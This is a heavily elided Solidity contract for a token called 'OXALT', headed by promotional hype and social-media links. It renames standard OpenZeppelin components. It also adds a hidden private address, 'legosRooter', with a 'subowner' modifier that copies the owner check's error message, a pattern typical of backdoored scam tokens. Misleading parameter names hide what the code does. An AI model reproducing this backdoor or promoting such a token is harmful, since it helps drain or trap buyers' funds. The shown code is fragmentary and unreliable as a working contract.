...
/*
OXALT is gearing up to be the next big thing in crypto. We’ve got dog coins influence in the mix, 
...
https://t.me/OXALT
https://twitter.com/OXALT
https://OXALT.com/
https://www.instagram.com/OXALT/
https://github.com/OXALT
https://www.reddit.com/r/OXALT/
https://m.facebook.com/OXALT
*/
...
/*
 * @dev Provides information about the current execution OXALT20Burnable, including the
 ...
 */
abstract contract OXALT20Burnable {
...
// File: @openzeppelin/contracts/access/OXALT20Ownable.sol
 ...
 * the owner.
 */
abstract contract OXALT20Ownable is OXALT20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OXALT20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OXALT20Ownable: new owner is the zero address");
 ...
 * `SafeOXALT` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeOXALT {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeOXALT: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeOXALT: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeOXALT: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeOXALT: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeOXALT: modulo by zero");
  }
...
contract OXALTToken is OXALT20Burnable, OXALT33, OXALT20Ownable {
    
    using SafeOXALT for uint256;
   ...
   address private legosRooter; 
    ...
    string public OXALTtelegramcchannel = "https://t.me/OXALT";
            function getOXALTtelegramcchannel() public view returns (string memory) {
        return OXALTtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {OXALT33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "OXALT20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {OXALT33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {OXALT33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {OXALT33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "OXALT33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {OXALT33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "OXALT33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "OXALT33: transfer from the zero address");
        require(shippingto != address(0), "OXALT33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "OXALT33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "OXALT33: approve from the zero address");
        require(transporteur != address(0), "OXALT33: approve to the zero address");
